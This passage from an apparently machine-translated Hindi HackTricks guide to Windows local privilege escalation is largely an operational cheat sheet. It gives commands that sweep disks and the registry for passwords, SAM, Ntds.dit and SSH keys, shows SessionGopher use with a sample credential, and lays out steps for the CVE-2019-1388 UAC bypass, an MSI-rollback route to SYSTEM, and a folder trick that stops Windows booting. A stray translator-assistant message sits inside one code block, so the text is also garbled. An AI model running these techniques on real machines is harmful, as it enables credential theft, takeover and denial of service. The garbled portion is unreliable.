%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
मुझे src/windows-hardening/windows-local-privilege-escalation/README.md का कंटेंट नहीं दिख रहा है। कृपया उस फ़ाइल (या जिन फ़ाइलों को आप खोजवाना/अनुवाद करवाना चाहते हैं) की सामग्री यहाँ पेस्ट करें या फ़ाइलों की स्पष्ट सूची दें ताकि मैं उनका अंग्रेजी से हिंदी में अनुवाद कर सकूं।
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में Credentials

आपको अंदर credentials खोजने के लिए Bin को भी जांचना चाहिए

कई प्रोग्राम्स द्वारा सेव किए गए पासवर्ड **पुनर्प्राप्त** करने के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### रजिस्ट्री के अंदर

**अन्य संभावित रजिस्ट्री कुंजियाँ जिनमें credentials हो सकते हैं**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़रों का इतिहास

आपको उन dbs की जांच करनी चाहिए जहाँ **Chrome or Firefox** के पासवर्ड स्टोर होते हैं।\
ब्राउज़रों के history, bookmarks और favourites भी जांचें — हो सकता है कुछ **पासवर्ड** वहाँ स्टोर हों।

ब्राउज़र से पासवर्ड निकालने के लिए टूल:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system के अंदर बनी एक तकनीक है जो अलग-अलग भाषाओं के software components के बीच **intercommunication** की अनुमति देती है। प्रत्येक COM component को **identified via a class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality expose करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces registry में परिभाषित होते हैं, क्रमशः **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को merge करके बनाया जाता है = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

बुनियादी तौर पर, अगर आप किसी भी उन DLLs को **overwrite** कर सकें जिन्हें execute किया जाना है, तो आप **escalate privileges** कर सकते हैं अगर वह DLL किसी अलग user द्वारा execute किया जाएगा।

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **फ़ाइलों और रजिस्ट्री में सामान्य पासवर्ड खोज**

**फ़ाइल सामग्री खोजें**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी निश्चित फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Tools जो passwords खोजते हैं

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin मैंने यह प्लगइन बनाया है ताकि यह **automatically execute every metasploit POST module that searches for credentials** victim के अंदर अपने आप चला सके।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वतः उन सभी फाइलों की खोज करता है जिनमें इस पेज में उल्लेखित passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) सिस्टम से password निकालने के लिए एक और शानदार tool है।

यह टूल [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) उन कई tools के **sessions**, **usernames** और **passwords** खोजता है जो यह डेटा clear text में सहेजते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना कीजिए कि **SYSTEM के रूप में चल रहा एक process ने एक नया process खोला है** (`OpenProcess()`) जिसमें **full access** हो। वही process **एक नया process भी बनाता है** (`CreateProcess()`) **जो low privileges वाला है पर main process के सभी open handles inherit कर लेता है**।\
फिर, यदि आपके पास उस low privileged process तक **full access** है, तो आप `OpenProcess()` से बनाये गये privileged process के **open handle** को पकड़कर उसमें **shellcode inject** कर सकते हैं।\
[Read this example for more information about **how to detect and exploit this vulnerability**.](leaked-handle-exploitation.md)\
[Read this **other post for a more complete explanation on how to test and abuse more open handlers of processes and threads inherited with different levels of permissions (not only full access)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, जिन्हें **pipes** कहा जाता है, process communication और डेटा ट्रांसफर सक्षम करते हैं।

Windows **Named Pipes** नामक एक फीचर देता है, जो unrelated processes को डेटा शेयर करने की अनुमति देता है, यहाँ तक कि अलग नेटवर्क्स पर भी। यह एक client/server आर्किटेक्चर जैसा है, जिसमें रोल्स को **named pipe server** और **named pipe client** के रूप में परिभाषित किया गया है।

जब कोई **client** किसी pipe के माध्यम से डेटा भेजता है, तो pipe सेट करने वाला **server** उस **client** की पहचान को अपना सकता है, बशर्ते उसके पास आवश्यक **SeImpersonate** अधिकार हों। यदि आप ऐसी किसी **privileged process** की पहचान कर लें जो उस pipe के जरिए संवाद करती है और जिसे आप नकल कर सकते हैं, तो आप उस प्रक्रिया की पहचान अपना कर, जब वह आपके बनाये pipe से इंटरैक्ट करे, उच्च प्राथमिकता (higher privileges) प्राप्त कर सकते हैं। इस तरह के हमले को Execute करने के निर्देशों के लिए उपयोगी गाइड [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) उपलब्ध हैं।

नीचे दिया गया टूल named pipe की communication को burp जैसे टूल के साथ **intercept** करने की अनुमति देता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह टूल सभी pipes को सूचीबद्ध कर देखने और privescs खोजने की अनुमति देता है** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## विविध

### File Extensions that could execute stuff in Windows

यह पेज देखें: **[https://filesec.io/](https://filesec.io/)**

### **Monitoring Command Lines for passwords**

जब user के रूप में shell मिलता है, तो हो सकता है कि scheduled tasks या अन्य processes चल रहे हों जो **command line पर credentials पास करते हों**। नीचे दिया गया script हर दो सेकंड में process के command lines को कैप्चर करके वर्तमान स्थिति की तुलना पिछले स्थिति से करता है और किसी भी बदलाव को आउटपुट करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास graphical interface (via console or RDP) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ वर्शन में unprivileged user से "NT\AUTHORITY SYSTEM" जैसे टर्मिनल या किसी अन्य process को चलाना संभव है।

यह एक ही vulnerability का उपयोग करके privileges escalate करने और UAC bypass दोनों एक साथ संभव बनाता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं होती और प्रक्रिया के दौरान उपयोग होने वाला binary Microsoft द्वारा signed और issued है।

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित कदम आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
आपके पास आवश्यक सभी फ़ाइलें और जानकारी निम्न GitHub रिपॉज़िटरी में हैं:

https://github.com/jas502n/CVE-2019-1388

## Administrator Medium से High Integrity Level तक / UAC Bypass

Integrity Levels के बारे में **जानने के लिए यह पढ़ें**:


{{#ref}}
integrity-levels.md
{{#endref}}

फिर **UAC और UAC bypasses के बारे में जानने के लिए यह पढ़ें:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Arbitrary Folder Delete/Move/Rename से SYSTEM EoP तक

यह तकनीक [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) में वर्णित है और exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs) के साथ मौजूद है।

यह हमला मूल रूप से Windows Installer की rollback सुविधा का दुरुपयोग करके अनइंस्टॉलेशन प्रक्रिया के दौरान वैध फ़ाइलों को दुर्भावनापूर्ण फ़ाइलों से बदलने पर आधारित है। इसके लिए attacker को एक **दुर्भावनापूर्ण MSI installer** बनाना होगा जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए उपयोग किया जाएगा, जिसे बाद में Windows Installer द्वारा अन्य MSI पैकेजों के अनइंस्टॉल के दौरान rollback फ़ाइलें स्टोर करने के लिए उपयोग किया जाएगा जहाँ rollback फ़ाइलों में malicious payload सम्मिलित किया गया होगा।

सारांशित तकनीक निम्नलिखित है:

1. **Stage 1 – Hijack की तैयारी ( `C:\Config.Msi` खाली छोड़ें )**

- Step 1: Install the MSI
- एक `.msi` बनाएं जो writable फ़ोल्डर (`TARGETDIR`) में एक नुकसान-रहित फ़ाइल (उदा., `dummy.txt`) इंस्टॉल करे।
- इंस्टॉलर को **"UAC Compliant"** के रूप में मार्क करें, ताकि एक **non-admin user** इसे चला सके।
- इंस्टॉल के बाद फ़ाइल के लिए एक **handle** खुला रखें।

- Step 2: Begin Uninstall
- उसी `.msi` को अनइंस्टॉल करें।
- अनइंस्टॉल प्रक्रिया फ़ाइलों को `C:\Config.Msi` में मूव करना शुरू कर देती है और उन्हें `.rbf` फ़ाइलों (rollback बैकअप) में रीनेम कर देती है।
- `GetFinalPathNameByHandle` का उपयोग करके खुली file handle को पोल करें ताकि पता चल सके कि फ़ाइल कब `C:\Config.Msi\<random>.rbf` बन जाती है।

- Step 3: Custom Syncing
- `.msi` में एक **custom uninstall action (`SyncOnRbfWritten`)** शामिल है जो:
- संकेत देता है जब `.rbf` लिखा गया हो।
- फिर अनइंस्टॉल को जारी रखने से पहले किसी अन्य इवेंट पर **wait** करता है।

- Step 4: Block Deletion of `.rbf`
- संकेत मिलने पर, `FILE_SHARE_DELETE` के बिना `.rbf` फ़ाइल **open** करें — यह इसे **delete किए जाने से रोकता है**।
- फिर uninstall के समाप्त होने के लिए **signal back** करें।
- Windows Installer `.rbf` को delete करने में विफल रहता है, और क्योंकि यह सभी सामग्री को हटा नहीं सकता, **`C:\Config.Msi` हटाया नहीं जाता**।

- Step 5: Manually Delete `.rbf`
- आप (attacker) `.rbf` फ़ाइल को मैन्युअली डिलीट कर देते हैं।
- अब **`C:\Config.Msi` खाली है**, hijack के लिए तैयार।

> इस बिंदु पर, `C:\Config.Msi` को हटाने के लिए **SYSTEM-level arbitrary folder delete vulnerability** ट्रिगर करें।

2. **Stage 2 – Rollback Scripts को दुर्भावनापूर्ण स्क्रिप्ट्स से बदलना**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- स्वयं `C:\Config.Msi` फ़ोल्डर को पुनः बनाएं।
- **weak DACLs** सेट करें (उदा., Everyone:F), और `WRITE_DAC` के साथ एक handle खुला रखें।

- Step 7: Run Another Install
- `.msi` को फिर से इंस्टॉल करें, साथ में:
- `TARGETDIR`: Writable location.
- `ERROROUT`: एक वैरिएबल जो forced failure ट्रिगर करता है।
- यह इंस्टॉल फिर से **rollback** को ट्रिगर करने के लिए उपयोग किया जाएगा, जो `.rbs` और `.rbf` पढ़ता है।

- Step 8: Monitor for `.rbs`
- `ReadDirectoryChangesW` का उपयोग करके `C:\Config.Msi` की निगरानी करें जब तक कि एक नया `.rbs` प्रकट न हो।
- इसकी फ़ाइलनाम कैप्चर करें।

- Step 9: Sync Before Rollback
- `.msi` में एक **custom install action (`SyncBeforeRollback`)** मौजूद है जो:
- `.rbs` बनते ही एक इवेंट signal करता है।
- फिर जारी रखने से पहले **wait** करता है।

- Step 10: Reapply Weak ACL
- `.rbs created` इवेंट मिलने के बाद:
- Windows Installer `C:\Config.Msi` पर **strong ACLs** पुनः लागू कर देता है।
- लेकिन चूंकि आपके पास अभी भी `WRITE_DAC` वाला handle है, आप फिर से **weak ACLs** लागू कर सकते हैं।

> ACLs केवल **handle open** पर लागू होते हैं, इसलिए आप अभी भी फ़ोल्डर में लिख सकते हैं।

- Step 11: Drop Fake `.rbs` and `.rbf`
- `.rbs` फ़ाइल को ओवरराइट करें एक **fake rollback script** से जो Windows को बताती है कि:
- आपकी `.rbf` फ़ाइल (malicious DLL) को एक **privileged location** में restore करे (उदा., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`)।
- आपकी fake `.rbf` डालें जिसमें एक **malicious SYSTEM-level payload DLL** हो।

- Step 12: Trigger the Rollback
- इंस्टॉलर को resume करने के लिए sync इवेंट को signal करें।
- एक **type 19 custom action (`ErrorOut`)** कॉन्फ़िगर किया गया है ताकि इंस्टॉल को जानबूझकर एक ज्ञात पॉइंट पर fail किया जा सके।
- इससे **rollback शुरू** हो जाता है।

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- आपकी malicious `.rbs` को पढ़ता है।
- आपकी `.rbf` DLL को target लोकेशन में कॉपी करता है।
- अब आपके पास **malicious DLL एक SYSTEM-loaded path में** मौजूद है।

- Final Step: Execute SYSTEM Code
- एक trusted **auto-elevated binary** चलाएँ (उदा., `osk.exe`) जो आपने hijack की हुई DLL को लोड करता है।
- **Boom**: आपका कोड **as SYSTEM** execute हो जाता है।


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

मुख्य MSI rollback तकनीक (पिछली) यह मानती है कि आप एक **entire folder** (उदा., `C:\Config.Msi`) को डिलीट कर सकते हैं। लेकिन अगर आपकी vulnerability केवल **arbitrary file deletion** की अनुमति देती है तो क्या होगा?

आप **NTFS internals** का उपयोग कर सकते हैं: प्रत्येक फ़ोल्डर में एक छिपा हुआ alternate data stream होता है जिसे कहा जाता है:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **index metadata** संग्रहीत करता है।

इसलिए, यदि आप किसी फ़ोल्डर की **`::$INDEX_ALLOCATION` stream को डिलीट कर देते हैं**, तो NTFS फ़ाइलसिस्टम से **पूरे फ़ोल्डर को हटा देता है।**

आप इसे standard file deletion APIs जैसे उपयोग करके कर सकते हैं:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> हालाँकि आप एक *file* delete API को कॉल कर रहे हैं, यह **folder को ही हटाता है**।

### Folder Contents Delete से SYSTEM EoP तक
यदि आपका primitive आपको arbitrary files/folders हटाने की अनुमति नहीं देता, लेकिन यह **attacker-controlled folder के *contents* को हटाने की अनुमति देता है**?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: `file1.txt` पर एक **oplock** लगाएँ
- जब कोई privileged process `file1.txt` को delete करने की कोशिश करेगा, तो oplock **execution को रोक देता है**।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM process को ट्रिगर करें (उदा., `SilentCleanup`)
- यह process फ़ोल्डरों (उदा., `%TEMP%`) को स्कैन करती है और उनकी सामग्री को हटाने की कोशिश करती है।
- जब यह `file1.txt` तक पहुँचती है, तो **oplock triggers** और नियंत्रण आपके callback को सौंप दिया जाता है।

4. चरण 4: oplock callback के अंदर – हटाने को पुननिर्देशित करें

- विकल्प A: `file1.txt` को किसी और स्थान पर ले जाएँ
- यह `folder1` को खाली कर देता है बिना oplock को तोड़े।
- सीधे `file1.txt` को हटाएँ मत — इससे oplock समय से पहले जारी हो जाएगा।

- विकल्प B: `folder1` को एक **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS internal stream को लक्षित करता है जो फ़ोल्डर मेटाडेटा संग्रहीत करता है — इसे हटाने से फ़ोल्डर भी हट जाता है।

5. चरण 5: Release the oplock
- SYSTEM प्रक्रिया जारी रहती है और `file1.txt` को हटाने की कोशिश करती है।
- लेकिन अब, junction + symlink के कारण, यह वास्तव में निम्नलिखित को हटा रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**परिणाम**: `C:\Config.Msi` SYSTEM द्वारा हटाया गया है।

### Arbitrary Folder Create से Permanent DoS तक

एक primitive का एक्सप्लॉइट करें जो आपको **create an arbitrary folder as SYSTEM/admin** करने की अनुमति देता है — भले ही **आप फ़ाइलें लिख न सकें** या **कमज़ोर permissions सेट न कर सकें**।

किसी **critical Windows driver** के नाम वाला **फ़ोल्डर** (फ़ाइल नहीं) बनाएं, उदाहरण के लिए:
```
C:\Windows\System32\cng.sys
```
- यह पाथ सामान्यतः `cng.sys` kernel-mode driver के अनुरूप होता है।
- यदि आप इसे **पहले फ़ोल्डर के रूप में बना देते हैं**, तो Windows बूट के समय वास्तविक ड्राइवर को लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` को लोड करने की कोशिश करता है।
- यह फ़ोल्डर को देखता है, वास्तविक ड्राइवर को **हल (resolve) नहीं कर पाता**, और **क्रैश हो जाता है या बूट रोक देता है**।
- बिना बाहरी हस्तक्षेप (जैसे, boot repair या disk access) के **कोई fallback नहीं** और **कोई recovery नहीं** होता।


## **High Integrity से SYSTEM तक**

### **नया service**

यदि आप पहले से ही किसी High Integrity process पर चल रहे हैं, तो **SYSTEM तक का path** सिर्फ **एक नया service बनाकर और execute करके** आसान हो सकता है:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> जब आप एक service binary बना रहे हों तो सुनिश्चित करें कि यह एक valid service हो या binary आवश्यक क्रियाएँ ठीक तरह से करता हो, क्योंकि यदि यह valid service नहीं होगा तो इसे 20s में बंद कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप AlwaysInstallElevated registry entries को enable करने और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** करने का प्रयास कर सकते हैं।\
[AlwaysInstallElevated से जुड़े registry keys और _.msi_ package कैसे install करें इसके बारे में अधिक जानकारी यहाँ।](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**कोड यहाँ पा सकते हैं**](seimpersonate-from-high-to-system.md)**।**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (शायद आप इन्हें पहले से ही किसी High Integrity process में पाएँगे), तो आप SeDebug privilege के साथ लगभग किसी भी process (not protected processes) को open कर सकेंगे, उस process का token **copy** कर सकेंगे, और उस token के साथ कोई arbitrary process **create** कर सकेंगे।\
इस technique में आमतौर पर SYSTEM के रूप में चल रहे किसी process को चुना जाता है जिसके पास सभी token privileges हों (_हाँ, आप SYSTEM processes पा सकते हैं जिनके पास सभी token privileges नहीं होते_)।\
**आप एक** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)** पा सकते हैं।**

### **Named Pipes**

यह technique meterpreter द्वारा getsystem में escalate करने के लिए उपयोग की जाती है। तकनीक यह है कि **एक pipe बनाया जाता है और फिर किसी service को बनाकर/abuse करके उस pipe पर लिखने के लिए बनाया जाता है**। फिर, जो **server** उस pipe को SeImpersonate privilege का उपयोग करके बनाता है वह pipe client (service) के token को **impersonate** कर पाएगा और SYSTEM privileges प्राप्त कर लेगा।\
यदि आप [**name pipes के बारे में और जानना चाहते हैं तो यह पढ़ें**](#named-pipe-client-impersonation)।\
यदि आप यह पढ़ना चाहते हैं कि [**High Integrity से System तक name pipes का उपयोग करके कैसे जाएँ**](from-high-integrity-to-system-with-name-pipes.md) तो यह देखें।

### Dll Hijacking

यदि आप किसी **dll** को hijack करने में सफल हो जाते हैं जिसे **SYSTEM** के रूप में चल रहे किसी **process** द्वारा **load** किया जा रहा है, तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह के privilege escalation के लिए उपयोगी है, और साथ ही यह High Integrity process से हासिल करना काफी आसान होता है क्योंकि उस process के पास dlls load करने वाले folders पर **write permissions** होते हैं।\
**आप** [**Dll hijacking के बारे में और यहाँ सीख सकते हैं**](dll-hijacking/index.html)**।**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- misconfigurations और sensitive files की जाँच के लिए (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी इकट्ठा करने के लिए (**[**यहाँ देखें**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- misconfigurations की जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी निकालता है। लोकल में उपयोग के लिए -Thorough का प्रयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials निकालता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- एकत्र किए गए passwords को domain पर spray करने के लिए**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS/NBNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **\~\~**\~\~ -- ज्ञात privesc कमजोरियों की खोज (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Admin rights की आवश्यकता)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc कमजोरियों की खोज (VisualStudio का उपयोग करके compile करना आवश्यक) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations खोजने के लिए host को enumerate करता है (ज्यादा gather info tool है बजाय privesc के) (compile करना आवश्यक) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials निकालता है (github में precompiled exe मौजूद है)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **\~\~**\~\~ -- misconfiguration की जाँच (executable github में precompiled)। अनुशंसित नहीं। Win10 में ठीक से काम नहीं करता।\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- संभावित misconfigurations की जाँच (python से exe)। अनुशंसित नहीं। Win10 में ठीक से काम नहीं करता।

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- इस पोस्ट के आधार पर बनाया गया टूल (proper काम करने के लिए accesschk की आवश्यकता नहीं लेकिन यह उसका उपयोग कर सकता है)।

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** के output को पढ़कर काम करने वाले exploit सुझाता है (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** के output को पढ़कर काम करने वाले exploit सुझाता है (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

आपको project को सही .NET version का उपयोग करके compile करना होगा ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). लक्षित host पर इंस्टॉल .NET version देखने के लिए आप कर सकते हैं:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## संदर्भ

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=\_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
